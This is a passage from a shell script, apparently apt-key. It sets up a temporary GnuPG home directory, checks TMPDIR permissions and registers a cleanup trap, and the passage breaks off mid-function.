    62	# gpg needs (in different versions more or less) files to function correctly,
    63	# so we give it its own homedir and generate some valid content for it later on
    64	create_gpg_home() {
    65	    # for cases in which we want to cache a homedir due to expensive setup
    66	    if [ -n "$GPGHOMEDIR" ]; then
    67		return
    68	    fi
    69	    if [ -n "$TMPDIR" ]; then
    70		# tmpdir is a directory and current user has rwx access to it
    71		# same tests as in apt-pkg/contrib/fileutl.cc GetTempDir()
    72		if [ ! -d "$TMPDIR" ] || [ ! -r "$TMPDIR" ] || [ ! -w "$TMPDIR" ] || [ ! -x "$TMPDIR" ]; then
    73		    unset TMPDIR
    74		fi
    75	    fi
    76	    GPGHOMEDIR="$(mktemp --directory --tmpdir 'apt-key-gpghome.XXXXXXXXXX')"
    77	    CURRENTTRAP="${CURRENTTRAP} cleanup_gpg_home;"
    78	    trap "${CURRENTTRAP}" 0 HUP INT QUIT ILL ABRT FPE SEGV PIPE TERM
    79	    if [ -z "$GPGHOMEDIR" ]; then
    80		apt_error "Could not create temporary gpg home directory in $TMPDIR (wrong permissions?)"
